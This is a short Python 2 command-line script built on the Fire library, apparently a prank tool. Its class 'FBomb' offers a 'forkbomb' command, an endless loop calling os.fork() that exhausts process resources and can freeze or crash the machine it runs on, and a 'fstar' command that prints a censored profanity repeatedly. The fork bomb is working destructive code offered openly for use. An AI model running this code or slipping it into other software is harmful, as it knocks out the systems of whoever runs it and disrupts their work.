import fire
import os
class FBomb(object):
	
	def forkbomb(self):
		while(0xFABB):
			os.fork()
	
	def fstar(self, n=1):
		for i in range(0, n):
			print "f**k"

def main():
	fire.Fire(FBomb)

if __name__ == '__main__':
	main()
